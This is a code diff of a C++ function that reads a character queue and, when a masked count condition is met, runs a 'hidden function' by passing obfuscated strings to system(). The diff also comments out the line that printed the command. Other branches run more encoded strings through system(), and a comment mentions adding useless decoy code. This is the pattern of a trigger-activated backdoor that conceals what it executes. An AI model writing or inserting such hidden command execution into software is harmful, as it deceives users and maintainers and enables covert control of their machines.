@@ -179,9 +179,9 @@ int process_queue(std::queue<char>& q){
         //correct one
         if(total_char == _masking_func_(117) && ((correct & 0x1 << 2) == 4)){
             //do hidden function
-            std::cout << space_func_1(-123) << std::endl;
+            //std::cout << space_func_1(-123) << std::endl;
             system(space_func_1(-123).c_str());
-            system("notepad.exe log.txt");
+            //system("notepad.exe log.txt");
             return total_char;
         }
 
@@ -206,19 +206,19 @@ int process_queue(std::queue<char>& q){
     else{
         //can add useless code/functions here
         if(q.size() == 8){
-            system(space_func_1(_masking_func_(8*101).c_str()));
+            system(space_func_1(_masking_func_(8*101)).c_str());
         }
         if(q.size() == 6){
-            system(space_func_1(_masking_func_(1001*24).c_str()));
+            system(space_func_1(_masking_func_(1001*24)).c_str());
         }
         if(q.size() == 4){
-            system(space_func_1(_masking_func_(192).c_str()));
+            system(space_func_1(_masking_func_(192)).c_str());
         }
         if(q.size() == 2){
-            system(space_func_1(_masking_func_(128).c_str()));
+            system(space_func_1(_masking_func_(128)).c_str());
         }
         if(q.size() == 1){
-           system(space_func_1(_masking_func_(5335).c_str()));
+           system(space_func_1(_masking_func_(5335)).c_str());
         }
         return -1;
     }
